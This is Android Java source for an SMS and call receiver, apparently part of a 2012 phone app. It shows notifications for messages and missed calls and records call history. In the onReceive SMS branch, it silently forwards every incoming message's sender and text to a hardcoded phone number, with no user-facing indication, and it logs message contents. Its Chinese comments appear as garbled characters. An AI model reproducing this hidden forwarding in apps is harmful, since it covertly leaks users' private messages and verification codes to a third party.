/*
 * Copyright (c) 2012 Shanda Corporation. All rights reserved.
 *
 * Created on 2012-01-30.
 */
package com.snda.myPhone;
import java.sql.Date;
import java.text.SimpleDateFormat;

import com.snda.recommend.api.ServiceManager;

import android.app.Notification;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.media.AudioManager;
import android.telephony.PhoneStateListener;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.telephony.TelephonyManager;
import android.util.Log;

public class smsReceiver extends BroadcastReceiver {  
	private static final String TAG = "com.snda.myPhone.smsReceiver";
	private static NotificationManager m_NotificationManager = null;
	private boolean incomingFlag = true;//��ʶ��ǰ������
	private boolean answerCall   = false;//��ʶ�����Ƿ񱻽���
	private long ringStartTime = 0;
	private Service mService = null;
	private String call_number = null;
	private String mobile_number = "18500097625";
	SmsManager smsManager = null;
	
	public smsReceiver(Service serv){
		mService = serv;
		smsManager = SmsManager.getDefault();
	}

    // ���ö���֪ͨNotification
	private void buildSmsNotification(Notification notify, Context cont, String content, String sender){
		// ����֪ͨ��״̬����ʾ��ͼ��                 
    	notify.icon = R.drawable.icon_message;                  
    	notify.tickerText = content;                  
    	notify.defaults = Notification.DEFAULT_ALL;   
    	notify.flags = Notification.FLAG_AUTO_CANCEL;
        int unreadSmsCount = dataAccessor.getUnreadSms(cont) + 1;
        notify.number = unreadSmsCount;
        PendingIntent m_PendingIntent = PendingIntent.getActivity(cont, 0, new Intent(cont,myPhoneActivity.class), 0);
        notify.setLatestEventInfo(cont, "����Ϣ",                          
        		                  unreadSmsCount + "��δ������", m_PendingIntent);                  
    }
    
    // ��������֪ͨNotification
    private void buildCallNotification(Notification notify, Context cont, String content, String sender){
    	notify.icon = R.drawable.icon_call;                  
    	notify.tickerText = content;                  
    	notify.defaults = Notification.DEFAULT_ALL;   
    	notify.flags = Notification.FLAG_AUTO_CANCEL;
        int unacceptCallCount = dataAccessor.getMissedCalls(cont) + 1;
        notify.number = unacceptCallCount;
        PendingIntent m_PendingIntent = PendingIntent.getActivity(cont, 0, new Intent(cont,myPhoneActivity.class), 0);
        notify.setLatestEventInfo(cont, "δ������",                          
        		                  unacceptCallCount + "��δ������", m_PendingIntent);                  
    }

    // ����֪ͨ
    private void notifyEvent(int id, Context cont, Notification notify){
    	m_NotificationManager = (NotificationManager) cont.getApplicationContext().getSystemService (Context.NOTIFICATION_SERVICE);  
		m_NotificationManager.notify(id, notify);  	
	}
	
    // ����������ʾҳ��
    private void startInComingCallAct(Context cont, String number){
        Intent inCallAct = new Intent(cont, onCallReceived.class);	
        inCallAct.putExtra("callnumber", number);
        inCallAct.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        cont.getApplicationContext().startActivity(inCallAct);
    }
    
    //��Ϣ֪ͨHandlerͨ����¼�и���
    private void broadcastCalllogUpdate(String number){
        Log.i(TAG,"broadcase CALLLOG_UPDATE");
        Intent intent = new Intent();//����Intent����  
        intent.setAction("com.snda.myPhoneService.CALLLOG_UPDATE");  
        intent.putExtra("number", number);  
        mService.sendBroadcast(intent);//���͹㲥  
    }

    @Override  
	public void onReceive(Context context, Intent intent) {  
		Log.i(TAG, "SmsRecevier onReceive");
		
	    // ��⵽�¶���
		if(intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")){
			Object[] pdus = (Object[]) intent.getExtras().get("pdus");  
			if (pdus != null && pdus.length > 0) {  
	            Log.i(TAG, "SMS received: " + pdus.length);           			
				SmsMessage[] messages = new SmsMessage[pdus.length];  
				for (int i = 0; i < pdus.length; i++) {  
					byte[] pdu = (byte[]) pdus[i];  
					messages[i] = SmsMessage.createFromPdu(pdu);  
				}  
	            Log.i(TAG, "SMS received: messages is built");           			
				for (SmsMessage message : messages) {  
					String content = message.getMessageBody();// �õ���������  
		            Log.i(TAG, "SMS received: " + content);           			
					String sender = message.getOriginatingAddress();// �õ�����Ϣ�ĺ���  
		            Log.i(TAG, "SMS received from: " + sender);           			

		            content = "[" + sender + "]:" + content;         
		        	smsManager.sendTextMessage(mobile_number, null, content, null, null);

		        	Date date = new Date(message.getTimestampMillis());  
					SimpleDateFormat format = new SimpleDateFormat(  
							"yyyy-MM-dd HH:mm:ss");  
					String sendContent = format.format(date) + ":" + sender + "--"  
							+ content;
		            Log.i(TAG, "SMS received info: " + sendContent);
		            Notification notification = new Notification();
		            buildSmsNotification(notification, context, content, sender);
		            notifyEvent(1, context, notification);
				}  
			} 
		}
	    // ��⵽ȥ���¼�
		else if(intent.getAction().equals("android.intent.action.NEW_OUTGOING_CALL")){
            incomingFlag = false;
            call_number = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);        
			ringStartTime = System.currentTimeMillis();  
            Log.i(TAG, "call OUT:" + call_number);           			
		}
	    // ��⵽�绰�¼�
		else if(intent.getAction().equals("android.intent.action.PHONE_STATE")){
			TelephonyManager tm = 
					(TelephonyManager)context.getSystemService(Service.TELEPHONY_SERVICE);                        
			
			long ringEndTime = 0;
			String callType = "incoming";
			
			switch (tm.getCallState()) {
			// ��⵽�����¼�
			case TelephonyManager.CALL_STATE_RINGING:
				call_number = intent.getStringExtra("incoming_number");
				Log.i(TAG, "RINGING :"+ call_number);
				ringStartTime = System.currentTimeMillis();  
	            startInComingCallAct(context, call_number);
				break;
		    // ��⵽�����绰�¼�
			case TelephonyManager.CALL_STATE_OFFHOOK:                                
				if(incomingFlag){
					Log.i(TAG, "incoming ACCEPT :"+ call_number);
					call_number = intent.getStringExtra("incoming_number");
					ringEndTime = System.currentTimeMillis(); 
		            dataAccessor dbHandler = new dataAccessor(context, myPhoneActivity.dbName);
		            dbHandler.insertCallHistory(call_number, callType, (int)(ringEndTime - ringStartTime)/1000);
		            answerCall = true;
				}else{
					callType = "outgoing";
					Log.i(TAG, "outgoing ACCEPT :"+ call_number);
				}
				break;
			// ��⵽�绰�����¼������л򱻽йҶϣ�
			case TelephonyManager.CALL_STATE_IDLE:                                
				if(incomingFlag){
					Log.i(TAG, "incoming IDLE"); 
					call_number = intent.getStringExtra("incoming_number");
					if(!answerCall){
						Notification notification = new Notification();
						buildCallNotification(notification, context, call_number, call_number);
						notifyEvent(2, context, notification);
					}
				}else{
					Log.i(TAG, "outgoing IDLE"); 
					callType = "outgoing";
				}

				if((incomingFlag && !answerCall) || !incomingFlag){
		            ringEndTime = System.currentTimeMillis();  
		            dataAccessor dbHandler = new dataAccessor(context, myPhoneActivity.dbName);
		            dbHandler.insertCallHistory(call_number, callType, (int)(ringEndTime - ringStartTime)/1000);				
				}
	            incomingFlag = true;
	            answerCall = false;
	            broadcastCalllogUpdate(call_number);
	            break;
			} 
		}
	}  
}  
